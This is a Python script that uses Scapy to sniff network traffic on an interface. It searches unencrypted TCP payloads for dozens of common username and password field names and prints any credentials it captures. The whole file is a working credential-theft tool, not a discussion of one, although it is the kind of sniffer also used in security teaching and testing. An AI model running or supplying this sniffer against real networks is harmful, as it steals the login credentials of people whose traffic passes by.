import re
from urllib import parse

from scapy.all import *
from scapy.layers.inet import TCP, IP


# extracts the login and passwords
def get_login_pass(body):
    user = None
    passwd = None
    # list of userfield names and password field
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        #
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            # the results from the search
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            # the results from the search
            passwd = pass_re.group()

    if user and passwd:
        return user, passwd


# filters the packets that may contain the username and passwords
def pkt_parser(packet):
    # check if tha packet has a tcp, raw  and IPlayer.
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        # the information in that tcp packet payload
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass is not None:
            # prints the site
            print(packet[TCP].payload)
            # print username
            print(parse.unquote(user_pass[0]))
            # prints password
            print(parse.unquote(user_pass[1]))
    else:
        pass

if __name__ == '__main__':
    try:
        interface = 'en0'  # make its user input
        sniff(iface=interface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print('Exiting')
        exit(0)
    except Scapy_Exception:
        print('Make sure your running Scapy as root ! (sudo)')
        exit(0)
    except:
        print('Interface not found')
        exit(0)
